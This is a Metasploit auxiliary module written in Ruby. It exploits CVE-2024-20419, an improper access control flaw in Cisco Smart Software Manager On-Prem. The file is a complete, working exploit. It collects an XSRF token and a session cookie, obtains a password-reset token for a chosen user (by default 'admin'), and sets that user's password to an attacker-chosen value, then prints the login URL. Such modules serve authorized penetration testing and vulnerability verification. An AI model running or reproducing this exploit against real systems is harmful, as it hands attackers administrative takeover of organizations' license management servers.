class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco Smart Software Manager (SSM) On-Prem Account Takeover (CVE-2024-20419)',
        'Description' => %q{
          This module exploits an improper access control vulnerability in Cisco Smart Software Manager (SSM) On-Prem <= 8-202206, by changing the
          password of an existing user to an attacker-controlled one.
        },
        'Author' => [
          'Mohammed Adel', # Discovery and PoC
          'Michael Heinzl' # MSF Module
        ],
        'References' => [
          ['CVE', '2024-20419'],
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cssm-auth-sLw3uhUy#vp'],
          ['URL', 'https://www.0xpolar.com/blog/CVE-2024-20419']
        ],
        'DisclosureDate' => '2024-07-20',
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => 'True'
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('NEW_PASSWORD', [true, 'New password for the specified user', Rex::Text.rand_text_alphanumeric(16) + '!']),
      OptString.new('USER', [true, 'The user of which to change the password of (default: admin)', 'admin'])
    ])
  end

  def decode_url(encoded_string)
    encoded_string.gsub(/%([0-9A-Fa-f]{2})/) do
      [::Regexp.last_match(1).to_i(16)].pack('C')
    end
  end

  def run
    # 1) Request oauth_adfs to obtain XSRF-TOKEN and _lic_engine_session
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'backend/settings/oauth_adfs'),
      'vars_get' => {
        'hostname' => Rex::Text.rand_text_alpha(6..10)
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    if res.code == 200
      print_good('Server reachable.')
    else
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
    end

    raw_res = res.to_s

    # Extract XSRF-TOKEN value
    xsrf_token_regex = /XSRF-TOKEN=([^;]*)/
    xsrf_token = xsrf_token_regex.match(raw_res)

    if xsrf_token
      xsrf_token_value = xsrf_token[1]
      if xsrf_token_value && !xsrf_token_value.empty?
        decoded_xsrf_token = decode_url(xsrf_token_value)
        print_good("Retrieved XSRF Token: #{decoded_xsrf_token}")
      else
        fail_with(Failure::UnexpectedReply, 'XSRF Token value is null or empty.')
      end
    else
      fail_with(Failure::UnexpectedReply, 'XSRF Token not found')
    end

    # Extract _lic_engine_session value
    lic_token_regex = /_lic_engine_session=([^;]*)/
    lic_token = lic_token_regex.match(raw_res)

    if lic_token
      lic_token_value = lic_token[1]
      if lic_token_value && !lic_token_value.empty?
        print_good("Retrieved _lic_engine_session: #{lic_token_value}")
      else
        fail_with(Failure::UnexpectedReply, '_lic_engine_session value is null or empty.')
      end
    else
      fail_with(Failure::UnexpectedReply, '_lic_engine_session not found')
    end

    # 2) Request generate_code to retrieve auth_token
    payload = "{\"uid\": \"#{datastore['USER']}\"}"

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'X-Xsrf-Token' => decoded_xsrf_token,
        'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
      },
      'uri' => normalize_uri(target_uri.path, '/backend/reset_password/generate_code'),
      'data' => payload
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    if res.code == 200
      json = res.get_json_document
      if json.key?('error_message')
        fail_with(Failure::UnexpectedReply, json['error_message'])
      elsif json.key?('auth_token')
        print_good('Retrieved auth_token: ' + json['auth_token'])
      end
    else
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
    end

    auth_token = json['auth_token']

    # 3) Request reset_password to change the password of the specified user
    payload = "{\"uid\": \"#{datastore['USER']}\", \"auth_token\": \"#{auth_token}\", \"password\": \"#{datastore['NEW_PASSWORD']}\", \"password_confirmation\": \"#{datastore['NEW_PASSWORD']}\", \"common_name\": \"\"}"

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'X-Xsrf-Token' => decoded_xsrf_token,
        'Cookie' => "_lic_engine_session=#{lic_token_value}; XSRF-TOKEN=#{decoded_xsrf_token}"
      },
      'uri' => normalize_uri(target_uri.path, '/backend/reset_password'),
      'data' => payload
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    if res.code == 200
      json = res.get_json_document
      if json.key?('error_message')
        fail_with(Failure::UnexpectedReply, json['error_message'])
      else
        store_valid_credential(user: datastore['USER'], private: datastore['NEW_PASSWORD'], proof: json)
        print_good("Password for the #{datastore['USER']} user was successfully updated: #{datastore['NEW_PASSWORD']}")
        print_good("Login at: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}/#/logIn?redirectURL=%2F") end
    else
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
    end
  end
end
